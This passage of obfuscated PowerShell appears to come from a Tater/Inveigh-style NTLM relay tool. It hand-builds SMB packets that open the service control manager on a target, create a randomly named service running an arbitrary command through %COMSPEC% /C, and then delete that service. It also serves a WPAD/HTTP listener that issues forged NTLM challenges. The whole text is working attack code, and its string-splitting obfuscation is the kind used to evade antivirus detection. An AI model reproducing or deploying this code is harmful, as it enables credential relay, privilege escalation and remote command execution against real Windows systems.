        ${S`Mb`_blo`B`_lENG`Th} = ${S`M`B_b`Lob_leNGTH}.("{1}{0}"-f'it','Spl').Invoke("-") | &("{0}{2}{3}{1}"-f 'ForE','t','ac','h-Objec'){[Char]  ( gi ('vARI'+'ablE:pF'+'e')).vAlUE::("{1}{0}"-f 't16','ToIn').Invoke(${_},16)}
        ${smB_B`yt`E_coUNt} =  (  ChIldiTEm ('VA'+'riaBL'+'E:'+'ncuz') ).VAlUe::"TOstR`ing"( (GET-CHILditEm VaRiablE:nCuz ).valUe::("{0}{2}{1}"-f'G','tBytes','e').Invoke(${hTtP_REQ`Ue`ST`_byTeS}."le`NGTH" + 28))
        ${sM`B_ByT`E_c`ount} = ${S`MB`_B`yte`_CouNT} -replace ("{2}{0}{1}"-f'0-0','0','-0'),""
        ${s`mB_by`T`E`_COuNT} = ${s`m`B_byTE_c`o`UnT}.("{0}{1}" -f 'S','plit').Invoke("-") | &("{3}{0}{2}{1}"-f 'O','ject','b','ForEach-'){[Char] (Get-ITeM VAriaBle:pfE  ).valUe::("{1}{0}" -f't16','ToIn').Invoke(${_},16)}
        ${sMB_`NETb`I`o`S_L`engTh} =   (ChiLDITem vARiAbLe:NCuZ).Value::"tost`Ri`NG"( $NCuZ::("{0}{1}"-f 'GetByte','s').Invoke(${htTP`_r`eQu`e`st_B`YtEs}."Le`NgTH" + 88))
        ${SMB_N`e`T`BIOs_lE`NgTH} = ${smB`_`NEtbIOS_`le`N`GTH} -replace ("{0}{1}" -f'-00-0','0'),""
        ${sMb_NetbIOs_`lEn`g`TH} = ${smB_N`eT`BI`O`s_`LENGtH}.("{1}{0}" -f 'it','Spl').Invoke("-") | &("{2}{3}{0}{1}" -f'Ob','ject','ForEa','ch-'){[Char]  $PfE::("{1}{0}"-f'Int16','To').Invoke(${_},16)}
          (VAriABLe ('cE'+'ni')  ).VALue::("{1}{0}{2}"-f'eve','R','rse').Invoke(${sM`B_NeT`BiOS`_`lEN`GtH})
        ${j} = 0

        :SMB_relay_response_loop while (${J} -lt 1)
        {
            ${SmB_RElAY_r`e`Spo`NsE_`send} = 0x00,0x00 +
                                       ${Sm`B`_n`etBIos_l`eNgtH} +
                                       0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,0x00,
                                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                       ${T`Ater}."pr`O`Ce`Ss_Id_Byt`Es" +
                                       ${Smb`_uSEr`_`iD} +
                                       0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,
                                       0x00,0x00,0x00 +
                                       ${smB_B`lOB_le`N`GtH} +
                                       0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                       ${Smb_by`TE_`C`ouNt} +
                                       ${HttP`_reqUE`St_BY`TEs} +
                                       0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,
                                       0x00,0x00,0x00,0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,0x00,
                                       0x00

            ${SMb`_r`ELaY_Re`s`POnse_`s`TREaM}.("{1}{0}"-f 'e','Writ').Invoke(${S`mB`_RELAy`_RE`SpoNs`E_se`Nd},0,${sMB_re`laY`_`ResPonSE_`seNd}."LeN`g`TH")
        	${SmB_`R`ElA`Y_resP`oNs`E_StreAM}.("{1}{0}" -f'ush','Fl').Invoke()
            ${sM`B_rEl`AY_`REspoNSe_`S`TReAM}.("{1}{0}"-f'ad','Re').Invoke(${s`mb_`R`E`la`Y`_reSPonsE_`BYTEs},0,${sMB_r`eLAY`_rESP`onse_bY`TeS}."le`Ngth")
            ${T`A`Ter}."sm`B`_reLAY`_`ACTiVE_S`TEP" = 2
            ${j}++
        }

        return ${sM`B`_ReLaY`_rEspo`NS`E_bYt`es}
    }

}


${s`mB_RElAy_EXecUtE_s`CRiP`T`Bl`oCk} =
{

    function SmB`RELaYEx`ec`UtE
    {
        param (${smb_rE`l`Ay_S`ockET},${SMB_US`ER`_Id})
    
        if (${SM`B_rEL`AY_`SOCKeT})
        {
            ${SmB_`RE`l`A`y_eXEcu`TE_S`T`REam} = ${SMB_r`E`La`y`_SocKeT}.("{2}{0}{1}" -f'etS','tream','G').Invoke()
        }

        ${sMb_r`E`La`Y_f`AILEd} = ${fAl`Se}
        ${smB`_re`l`AY_e`XecutE`_B`YtES} = &("{0}{3}{2}{1}"-f 'Ne','t','jec','w-Ob') ("{1}{0}{2}"-f'.B','System','yte[]') 1024
        ${smb_`SERvi`CE_Ran`doM} =  ( lS ("v"+"ariABL"+"e:3mHEG"+"8")  ).VALue::("{0}{1}"-f'Jo','in').Invoke("00-", (1..20 | &("{1}{2}{0}{3}"-f 'Obj','ForE','ach-','ect'){"{0:X2}-" -f (&("{0}{1}{2}" -f 'Get','-Ra','ndom') -Minimum 65 -Maximum 90)}))
        ${SmB`_sE`RVicE} = ${SmB`_se`RViCe`_rA`NdOM} -replace "-00",""
        ${smb`_`se`RViCe} = ${s`Mb_SERvi`ce}.("{3}{1}{0}{2}"-f'i','ubstr','ng','S').Invoke(0,${s`Mb_`sE`RvIce}."LE`NGth"-1)
        ${smB_seR`Vi`Ce} = ${smb_S`E`RVi`CE}.("{0}{1}"-f 'Spli','t').Invoke("-") | &("{1}{2}{0}{3}"-f '-','Fo','rEach','Object'){[Char]  (  LS ("v"+"AriAbLE:p"+"Fe")).vAlUe::("{0}{2}{1}" -f'T','t16','oIn').Invoke(${_},16)}
        ${SM`B_seRvI`CE} = &("{1}{2}{0}"-f't','Ne','w-Objec') ("{3}{0}{2}{1}" -f 'm.St','ing','r','Syste') (${SM`B_sErv`ice},0,${sMb_`s`eRvI`cE}."l`engTh")
        ${SMb`_SeRV`ICE_ran`dOm} += ("{1}{0}{2}"-f '00-0','00-','0')
        [Byte[]] ${S`Mb_s`ERv`IcE_BYT`Es} = ${Smb`_SERVICe`_RAn`dOM}.("{0}{1}" -f 'Spl','it').Invoke("-") | &("{1}{0}{2}" -f'E','For','ach-Object'){[Char] $PfE::("{1}{0}"-f 'nt16','ToI').Invoke(${_},16)}
        ${sMb_`RE`FEREnT_i`D`_bYtES} = [String](1..4 | &("{1}{2}{3}{4}{0}"-f't','For','Each-','Ob','jec'){"{0:X2}" -f (&("{0}{3}{1}{2}"-f 'Get-Ra','do','m','n') -Minimum 1 -Maximum 255)})
        ${sM`B_reFeRENt`_id_B`Y`TES} = ${smb`_REFE`RENt_`I`d`_bYt`Es}.("{0}{1}" -f'Spl','it').Invoke(" ") | &("{2}{1}{0}"-f 'ect','bj','ForEach-O'){[Char] $PFE::("{2}{1}{0}"-f '16','nt','ToI').Invoke(${_},16)}
        ${C`oM`MaND} = ('%C'+'OMSPE'+'C% '+'/C'+' '+"`"") + ${Co`MMAnd} + "`""
          $Mr9Pqh::"UT`F8".("{1}{2}{0}" -f 'Bytes','G','et').Invoke(${co`M`manD}) | &("{1}{2}{0}"-f 't','ForEach-O','bjec'){ ${sm`B_Rel`Ay_CO`M`maND} += "{0:X2}-00-" -f ${_} }

        if([Bool](${co`Mm`AND}."LeNG`TH" % 2))
        {
            ${s`m`B_`R`ElAy_cOMm`AnD} += ("{1}{0}"-f '0-00','0')
        }
        else
        {
            ${SMb_re`l`A`y_`CoMMa`Nd} += ("{2}{3}{0}{1}" -f'-00-0','0','0','0-00')
        }    
        
        [Byte[]] ${Smb_Relay`_C`om`mand_B`yTes} = ${s`Mb_r`ElAy_`C`O`mMAND}.("{1}{0}" -f'lit','Sp').Invoke("-") | &("{0}{2}{1}{3}"-f 'ForE','Obje','ach-','ct'){[Char] $PFE::("{1}{2}{0}"-f '16','ToIn','t').Invoke(${_},16)}
        ${smb_`sERViCE`_DAtA`_L`e`N`Gt`H_`BYTEs} =  ( vARIAble ("Nc"+"Uz")).ValUe::("{0}{2}{1}"-f 'G','tes','etBy').Invoke(${sm`B_rELaY_`cOMmAN`D`_`ByTes}."lEN`Gth" + ${S`mB_`s`erViC`e`_ByTeS}."l`E`NgtH" + 237)
        ${sMB_SeRV`Ic`e_daT`A_l`eNgth_B`yTes} = ${Sm`B_sERViCE_D`At`A_leNG`T`h_ByTes}[2..0]
        ${s`mB_SErVi`cE_`ByT`e_`cOu`Nt_bYtEs} =  ( gET-cHIldITeM variaBLE:NcuZ).VALue::("{1}{0}" -f 'ytes','GetB').Invoke(${Smb_R`elay_`cO`mMaND`_Byt`es}."lEN`g`Th" + ${SMb`_SerVic`e_byT`Es}."lE`NgTh" + 174)
        ${smb`_`Se`Rvic`E_BY`T`E_CouNt_BY`TES} = ${s`Mb_SER`VI`ce_`BY`T`e_COUNt_Byt`ES}[0..1]   
        ${SmB_r`El`A`y_`Co`mMAN`D_`lENGth_b`YteS} =   (  Get-ITEm ("VARiAblE"+":N"+"cUz")  ).vaLue::("{0}{2}{1}"-f 'Ge','Bytes','t').Invoke(${smB_RelAy`_coMm`A`N`D_BY`TES}."l`EN`GtH" / 2)
        ${k} = 0

        :SMB_relay_execute_loop while (${k} -lt 12)
        {

            switch (${k})
            {
            
                0
                {
                    ${s`mB_RELay_E`x`EC`UTe_`SEnD} = 0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,
                                              0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0xff,0xff +
                                              ${t`AtEr}."prOC`ESS_id_By`Tes" +
                                              ${s`M`B_U`ser_iD} +
                                              0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,
                                              0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31,0x30,0x2e,0x32,0x2e,0x31,0x30,
                                              0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00
                }
                  
                1
                {
                    ${sMb_RE`l`A`Y_`Exe`c`UtE_SeND} = 0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,
                                              0x18,0x02,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${t`Ater}."PRo`ceS`S_i`D_bYTES" +
                                              ${S`mB`_UsEr_Id} +
                                              0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,
                                              0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00
                }
                
                2
                {
                    ${s`mb_rel`AY_eXe`cUt`e_SEND} = 0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${T`A`TEr}."Pr`oC`e`ss_iD_`BYTeS" +
                                              ${S`M`B_us`ER_ID} +
                                              0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00,0x00,0x00,0x48,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,
                                              0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,
                                              0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
                                              0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,
                                              0x00,0x10,0x03,0x02,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,
                                              0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,
                                              0x00
                        
                    ${s`mB_MU`LTiPL`EX_iD} = 0x05
                }
               
                3
                { 
                    ${S`Mb_reL`AY_E`XEcu`Te_s`E`ND} = ${SM`B_rEla`y`_e`x`ecUTe_REaDan`dreqUe`ST}
                }
                
                4
                {
                    ${s`m`B_RElAY_E`XECUTE_s`ENd} = 0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${TA`T`Er}."pRo`c`ess_Id`_bYT`es" +
                                              ${sMB_U`SER_`iD} +
                                              0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x50,0x00,0x00,0x00,0x5c,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,
                                              0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03,0x00,0x15,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${sMB_`SErV`iCe_`BYt`eS} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00
                        
                    ${Smb`_mU`L`TipLex_ID} = 0x07
                }
                
                5
                {  
                    ${sMB`_r`elAy_`eXecUte_s`eND} = ${s`mB_r`elaY`_`e`xEc`UTE_r`EaDand`Re`qU`ESt}
                }
                
                6
                {
                    ${smB_`RE`la`y_Ex`eCUtE_SeND} = [Array]0x00 +
                                              ${sMb_sEr`VIce_DATA_le`NGT`h_b`YTES} +
                                              0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08 +
                                              ${t`AteR}."PROC`EsS_i`d_BYT`Es" +
                                              ${s`Mb_`UsEr_Id} +
                                              0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00 +
                                              ${SmB`_S`ErViCe_`BYtE_C`o`UNt_`ByTEs} +
                                              0x00,0x00 +
                                              ${sMb_`seRvic`E_`BYtE`_cOUNt_ByT`ES} +
                                              0x3f,0x00,0x00,0x00,0x00,0x00 +
                                              ${SMB_sE`RVI`ce`_BytE`_cOUn`T_B`y`Tes} +
                                              0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00 +
                                              ${smB`_Se`RVicE`_B`YT`e_coU`Nt`_bY`TES} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,
                                              0x00 +
                                              ${S`M`B_c`OntEXt_H`AnDlEr} +
                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${SMb_SerVI`Ce`_`BYTES} +
                                              0x00,0x00 +
                                              ${SMb`_r`E`FEREN`T`_iD_BY`TeS} +
                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${Sm`B_`Serv`iCE_b`Y`TEs} +
                                              0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00 +
                                              ${s`MB_`REl`A`y_ComM`A`N`d_LEngtH`_bYtes} +
                                              0x00,0x00,0x00,0x00 +
                                              ${sm`B_rELaY`_COMMAnD_LeNgtH`_`B`yTES} +
                                              ${S`mB`_RelaY_c`o`mmAnD`_B`YtEs} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00
                        
                    ${SMb`_`mulT`iPl`eX_id} = 0x09
                }

                7
                {
                    ${s`mb_Rel`AY`_exe`CutE_S`e`ND} = ${SmB_rEla`y_ExE`CUT`e`_`REAdANDRE`quesT}
                }
                
                8
                {
                    ${Smb_Re`L`Ay_`eXe`cUTE_se`ND} = 0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${T`Ater}."p`RocesS_Id_b`Y`TES" +
                                              ${smB_U`Se`R`_id} +
                                              0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x34,0x00,0x00,0x00,0x34,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,
                                              0x00,0x00,0x00,0x13,0x00 +
                                              ${smb_c`oN`TE`xT`_`haNdleR} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                }
                
                9
                {
                    ${s`mb`_Rela`y_eXEcUtE_SE`ND} = ${smb_ReLA`y_e`X`E`c`UTE`_RE`A`DaNdREQu`e`St}
                }
                
                10
                { 
                    ${S`mb`_re`lAy_exECUTe_sE`Nd} = 0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${t`AT`eR}."pr`oCe`S`S`_id_ByTES" +
                                              ${s`Mb_UseR_`iD} +
                                              0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x2c,0x00,0x00,0x00,0x2c,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,
                                              0x00,0x00,0x00,0x02,0x00 +
                                              ${sMb_cOntE`X`T_hAN`D`ler}
                }

                11
                {
                    ${smB_`Re`lay`_ExEcU`Te_SeND} = ${sm`B`_r`ELAy_`e`xecute`_R`eAD`AndREquEsT}
                }

            }
           
            ${sMB`_r`e`lay_Exe`cUT`e`_`sTReAm}.("{1}{0}" -f 'rite','W').Invoke(${sMb_rel`A`Y_exEC`UTe_`seND},0,${S`MB_`Rel`AY_Ex`ecU`TE_Se`Nd}."leN`gtH")
            ${sMB_RelA`y_EXECU`TE_S`T`REAM}.("{1}{0}" -f'sh','Flu').Invoke()
            
            if (${k} -eq 5) 
            {
                ${s`mb`_reLaY`_E`x`ecut`e_StrEaM}.("{0}{1}"-f'Re','ad').Invoke(${sm`B_rElA`Y_e`xe`cUTE_`B`ytes},0,${Sm`B_rELAY_Exe`C`U`TE_bYTEs}."LEn`gth")
                ${s`mB`_Con`TEX`T_HaN`dLER} = ${sMB_rE`LA`y_`Exec`Ute_b`Y`TEs}[88..107]

                if((  $nCuZ::"T`OSt`RInG"(${smB_`R`E`lAy`_Ex`ecUTe_B`ytES}[108..111]) -eq ("{2}{1}{0}" -f'0','-00-0','00-00')) -and (  (  Get-ChILDItEm ('VARIAB'+'LE'+':nCu'+'Z')).Value::("{0}{1}" -f'ToStri','ng').Invoke(${S`MB`_CoNT`eXT`_HAn`DlEr}) -ne ("{14}{6}{13}{10}{2}{11}{12}{8}{0}{9}{5}{7}{3}{4}{1}" -f '00-00-','0','0-00-00-00-00-00-00-00-0','0','-0','0','0-','-0','-','00-0','00-0','0-0','0','00-00-','0')))
                {
                    
                }
                elseif(  (Ls  ('va'+'RI'+'Able:nCUZ') ).vaLUE::"To`strinG"(${Smb_RelAY_ExECUt`E`_`B`YTES}[108..111]) -eq ("{2}{1}{0}"-f'-00-00','0','05-0'))
                {
                    ${T`At`ER}."cOnsO`l`e_Q`Ue`Ue".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\ ") + ("$HTTP_NTLM_user_string "+'i'+'s '+'no'+'t '+'a '+'loca'+'l '+'admi'+'ni'+'st'+'rator '+'on'+' '+'') + "$SMBRelayTarget")
                    ${S`mb`_rE`lay_fAiLED} = ${t`RUE}
                }
                else
                {
                    ${s`m`B_Re`lay_f`AIleD} = ${tR`UE}
                }


            }
            elseif (${K} -eq 7 -or ${k} -eq 9 -or ${k} -eq 11)
            {
                ${smb_RelA`Y_ExE`c`UTe`_stReAm}.("{1}{0}" -f 'ad','Re').Invoke(${sMB_REla`y`_ExE`C`U`TE_by`Tes},0,${SmB`_R`e`LAy_ex`E`CUte_b`ytEs}."LE`NGTh")

                switch(${k})
                {

                    7 {
                        ${sMB_`COn`TeXT_HAN`D`l`Er} = ${smB_`R`eLAY`_e`XeC`UTe_`BYt`es}[92..111]
                        ${Smb`_r`eLaY_`exE`CuTE_erRoR`_m`ESSaGE} = ("{10}{8}{6}{7}{3}{9}{1}{4}{2}{5}{11}{0}"-f 'atch','t ','mi','fau','context ','s','r','eation ','ervice c','l','S','m')
                    }

                    11 {
                        ${Sm`B_reL`AY_`exe`CUtE_`ERror_me`ss`AGE} = ("{6}{3}{0}{7}{1}{5}{2}{4}"-f 'aul',' contex','mis','tart f','match','t ','Service s','t')
                    }

                    13 {
                        ${SMB_`RE`laY_Exe`CUTe_`ErRor`_MES`s`AGE} = ("{5}{6}{8}{3}{9}{0}{7}{2}{1}{4}"-f'conte','mat','t mis','n fa','ch','Se','rvic','x','e deletio','ult ')
                    }

                }
                
                if(  $nCuZ::"TO`S`TrINg"(${Smb_c`oNTe`XT_h`A`ND`Ler}[0..3]) -ne ("{1}{2}{0}" -f'0-00','00','-00-0'))
                {
                    ${SMB_`ReLay_F`AIL`ED} = ${T`RuE}
                }

                if(  $nCUZ::"tOs`TrinG"(${s`m`B_rEl`Ay_`E`xECUte_BYTeS}[88..91]) -eq ("{1}{0}{2}" -f'00','1a-00-','-1c'))
                {
                    ${T`At`ER}."cO`NsoLe_qU`eUE".("{1}{0}"-f'd','Ad').Invoke(("$SMB_relay_execute_error_message "+'s'+'erv'+'ice '+'o'+'n '+"$SMBRelayTarget"))
                    ${sm`B_RElA`Y_F`A`Iled} = ${t`RUE}
                }

            }        
            else
            {
                ${SM`B`_RELAY_ExE`C`U`TE_sTRe`Am}.("{1}{0}" -f'ead','R').Invoke(${smB_RE`LA`y_`executE_by`TeS},0,${SMb_R`ELay_E`xec`Ut`e_`BYtes}."lenG`Th")    
            }
            
            if(!${S`M`B_R`e`lay_fai`Led} -and ${k} -eq 7)
            {
                ${t`A`Ter}."CONS`Ole_q`UEUE".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service created on $SMBRelayTarget "))
            }
            elseif(!${smb_RelA`y_`FA`ILeD} -and ${K} -eq 9)
            {
                ${tAT`er}."C`O`NsoLE_`quEUE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - Command likely executed on $SMBRelayTarget "))
            }
            elseif(!${smb`_`RELAy_F`AILEd} -and ${K} -eq 11)
            {
                ${Ta`T`eR}."CoNS`oL`E_Q`U`euE".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $SMBRelayTarget "))
            }   
            
            ${sMB_`Re`LAY_E`XE`cU`TE`_rEa`DA`NDreq`UeST} = 0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                ${Ta`T`er}."prOc`E`Ss_Id_`ByTEs" +
                                                ${smb`_Use`R_id} +
                                                ${sm`B_`mULTIp`lEX_iD} +
                                                0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,
                                                0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00
            
            if(${smb_r`El`AY`_fA`iLEd})
            {
                ${tat`ER}."cONsO`L`e`_QUEUE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay failed on $SMBRelayTarget "))
                BREAK ("{4}{1}{2}{0}{3}" -f'e_lo','lay_ex','ecut','op','SMB_re')
            }

            ${K}++

        }
        
        ${T`ATEr}."S`MB_r`elay_AC`T`i`Ve_StEP" = 0
        
        ${Smb`_R`eLaY_sO`cket}.("{0}{1}" -f 'Cl','ose').Invoke()

        if(!${sMb_`RE`L`Ay_faIlED})
        {
            ${t`AtER}."SMBr`ElAY_S`UC`ce`Ss" = ${tR`UE}
        }

    }

}


${H`TTp_S`cRIP`TbLoCK} = 
{
    param (${CoMMa`ND},${h`TT`PpoRt},${W`pa`d`DiRec`ThO`sTS},${Wp`A`D`PorT})

    function NTlmc`Ha`l`l`eNgebaSE64
    {
        ${HTtp`_`T`IM`eStamp} = &("{2}{1}{0}"-f'te','a','Get-D')
        ${h`TTP`_t`imEsT`Amp} = ${HTTp`_timE`st`A`MP}.("{2}{0}{1}"-f'e','Time','ToFil').Invoke()
        ${ht`TP`_`TiMEstAMp} =   $NcUz::"tOS`T`RIng"(  $nCUz::("{2}{1}{0}"-f'tes','y','GetB').Invoke(${hTtp_t`Im`EStaMP}))
        ${hT`Tp_T`IMeST`AMP} = ${htT`p_tIM`es`TAmP}.("{0}{1}" -f'Spli','t').Invoke("-") | &("{0}{1}{3}{2}"-f 'ForEac','h-','ject','Ob'){[Char]  (  gCi  ("VarIAbl"+"e:pf"+"E")).vAlUE::("{0}{1}" -f 'ToIn','t16').Invoke(${_},16)}

        ${HtT`P_nT`l`M`_BytEs} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                           0x00,0x00,0x00,0x05,0xc2,0x89,0xa2 +
                           ${HTTp_C`HAlLeN`G`E_`BYTES} +
                           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                           0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                           0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                           0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                           0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                           0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                           0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                           0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                           0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                           ${HTTp`_T`i`mesT`AMP} +
                           0x00,0x00,0x00,0x00,0x0a,0x0a

        ${NTlm_chALlE`NGe`_b`AS`e64} =   (get-VaRIAble PfE  -VALueonLy  )::"to`BASE6`4`STRING"(${hTT`P_Nt`l`M_by`Tes})
        ${n`TLm} = ("{0}{1}"-f'N','TLM ') + ${nTl`M_chAlLe`N`gE`_ba`Se64}
        ${n`TLM_c`hAL`LenGE} = ${h`TtP_cH`AlL`e`NgE}

        return ${n`TlM}
    }

    ${S`m`BRela`yTARg`eT} = ("{1}{2}{3}{0}" -f '.0.1','127','.','0')
    ${Htt`p_pOR`T`_BytEs} =  ( geT-iteM VaRiablE:mr9PQh  ).VALue::"ut`F8".("{0}{1}{2}" -f'Ge','t','Bytes').Invoke(${H`Ttp`P`oRT})
    ${wPAd`diR`eC`THoS`Ts} += ("{0}{1}{2}{3}" -f'loc','alh','o','st')
    ${h`Ttp_CoNtE`NT`_lEnG`TH} = ${Wp`ADPorT}."Le`NGtH" + 62

    foreach(${wPa`d`_DIrEc`T_hOSt} in ${wpAD`d`I`REcThoStS})
    {
        ${HTt`P_`c`o`NTeNT_Le`NgTH} += ${wpaD_DiR`Ec`T_`h`osT}."lEnG`TH" + 43
        ${h`TTp_con`Tent_LenG`TH_`ByT`ES} =  ( varIaBLe ('MR9pQ'+'H')  -valueONLy )::"UT`F8".("{1}{0}{2}" -f'tB','Ge','ytes').Invoke(${HTT`p`_cO`N`TeNt`_`LEngth})
